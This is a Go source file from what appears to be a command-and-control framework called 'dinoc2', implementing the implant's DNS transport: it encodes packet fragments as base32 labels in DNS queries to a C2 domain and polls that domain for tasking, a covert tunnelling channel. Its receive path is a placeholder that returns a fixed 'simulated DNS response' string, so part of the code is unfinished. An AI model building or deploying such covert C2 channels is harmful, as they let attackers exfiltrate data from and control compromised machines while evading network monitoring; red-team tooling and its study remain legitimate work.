package client

import (
	"strings"
	"encoding/base32"
	"context"
	"fmt"
	"net"
	"time"

	"dinoc2/pkg/crypto"
	"dinoc2/pkg/protocol"
)

// DNSConnection implements a DNS connection to the server
type DNSConnection struct {
	*BaseConnection
	resolver   *net.Resolver
	domainBase string
}

// NewDNSConnection creates a new DNS connection
func NewDNSConnection(serverAddress string, protocolHandler *protocol.ProtocolHandler, sessionID crypto.SessionID) (*DNSConnection, error) {
	base := NewBaseConnection(serverAddress, protocolHandler, sessionID, ProtocolDNS)

	// Extract domain base from server address
	// In a real implementation, this would be more sophisticated
	domainBase := serverAddress
	if domainBase == "" {
		domainBase = "c2.example.com"
	}

	// Create custom resolver
	resolver := &net.Resolver{
		PreferGo: true,
		Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
			d := net.Dialer{
				Timeout: 10 * time.Second,
			}
			return d.DialContext(ctx, "udp", serverAddress)
		},
	}

	return &DNSConnection{
		BaseConnection: base,
		resolver:       resolver,
		domainBase:     domainBase,
	}, nil
}

// Connect establishes a DNS connection to the server
func (c *DNSConnection) Connect() error {
	// For DNS, we don't maintain a persistent connection
	// Instead, we'll verify the server is reachable
	
	// Test DNS resolution
	_, err := c.resolver.LookupHost(context.Background(), c.domainBase)
	if err != nil {
		return fmt.Errorf("failed to resolve domain: %w", err)
	}

	c.connected = true

	// Perform initial handshake
	err = c.performHandshake()
	if err != nil {
		c.Close()
		return fmt.Errorf("handshake failed: %w", err)
	}

	return nil
}

// Close closes the DNS connection
func (c *DNSConnection) Close() error {
	// For DNS, we don't maintain a persistent connection
	c.connected = false
	return nil
}

// SendPacket sends a packet over the DNS connection
func (c *DNSConnection) SendPacket(packet *protocol.Packet) error {
	if !c.connected {
		return fmt.Errorf("not connected")
	}

	// Prepare the packet for sending
	fragments, err := c.protocolHandler.PrepareOutgoingPacket(packet, c.sessionID, true)
	if err != nil {
		return fmt.Errorf("failed to prepare packet: %w", err)
	}

	// Send each fragment as a separate DNS query
	for i, fragment := range fragments {
		// Encode fragment as DNS query
		// In a real implementation, this would be more sophisticated
		// For now, we'll just do a simple base32 encoding
		encodedData := base32.StdEncoding.EncodeToString(fragment)
		
		// Split into DNS-like segments (max 63 chars per label)
		var segments []string
		for j := 0; j < len(encodedData); j += 63 {
			end := j + 63
			if end > len(encodedData) {
				end = len(encodedData)
			}
			segments = append(segments, encodedData[j:end])
		}
		
		// Create DNS query domain
		queryDomain := fmt.Sprintf("%s.%d.%s.%s", 
			strings.Join(segments, "."),
			i,
			string(c.sessionID)[:8],
			c.domainBase)
		
		// Send DNS query
		_, err := c.resolver.LookupHost(context.Background(), queryDomain)
		if err != nil {
			// DNS errors are expected, as we're using DNS for data transport
			// In a real implementation, we would parse the response for data
		}
	}

	return nil
}

// ReceivePacket receives a packet from the DNS connection
func (c *DNSConnection) ReceivePacket() (*protocol.Packet, error) {
	if !c.connected {
		return nil, fmt.Errorf("not connected")
	}

	// Create poll query
	pollDomain := fmt.Sprintf("poll.%s.%s", 
		string(c.sessionID)[:8],
		c.domainBase)
	
	// Set context with timeout
	ctx, cancel := context.WithTimeout(context.Background(), 100*time.Millisecond)
	defer cancel()
	
	// Send DNS query
	ips, err := c.resolver.LookupHost(ctx, pollDomain)
	if err != nil {
		// If timeout, return nil without error
		if err, ok := err.(interface{ Timeout() bool }); ok && err.Timeout() {
			return nil, nil
		}
		
		// DNS errors are expected, as we're using DNS for data transport
		// In a real implementation, we would parse the error for data
		return nil, nil
	}
	
	if len(ips) == 0 {
		return nil, nil
	}
	
	// In a real implementation, we would extract data from the IPs
	// For now, we'll just simulate receiving a packet
	
	// This is a placeholder for actual DNS data extraction
	// In a real implementation, this would decode the data from DNS responses
	data := []byte("simulated DNS response")
	
	// Process the packet
	packet, err := c.protocolHandler.ProcessIncomingPacket(data, c.sessionID)
	if err != nil {
		return nil, fmt.Errorf("failed to process packet: %w", err)
	}

	return packet, nil
}

// performHandshake performs the initial handshake with the server
func (c *DNSConnection) performHandshake() error {
	// Create handshake packet
	handshake := protocol.NewPacket(protocol.PacketTypeKeyExchange, []byte(string(c.sessionID)))

	// Send handshake packet
	err := c.SendPacket(handshake)
	if err != nil {
		return fmt.Errorf("failed to send handshake: %w", err)
	}

	// Wait for response
	for i := 0; i < 5; i++ {
		// Receive response
		response, err := c.ReceivePacket()
		if err != nil {
			return fmt.Errorf("failed to receive handshake response: %w", err)
		}

		if response == nil {
			time.Sleep(500 * time.Millisecond)
			continue
		}

		// Verify response
		if response.Header.Type != protocol.PacketTypeKeyExchange {
			return fmt.Errorf("unexpected response type: %d", response.Header.Type)
		}

		// Handshake successful
		return nil
	}

	return fmt.Errorf("handshake timed out")
}
